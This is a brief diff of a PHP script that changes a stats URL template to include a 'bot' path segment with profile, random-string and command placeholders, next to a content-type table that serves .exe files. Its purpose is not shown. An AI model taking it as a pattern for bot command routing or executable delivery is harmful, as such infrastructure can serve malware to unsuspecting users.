@@ -3,7 +3,7 @@ ob_start();
 
 
 $randomString = generateRandomString();
-$stats_url = "http://{alias}/{server}/{profile}/$randomString/none/{command}";
+$stats_url = "http://{alias}/bot/{profile}/$randomString/none/{command}";
 
 $contentTypes = [
     'exe' => 'application/octet-stream',
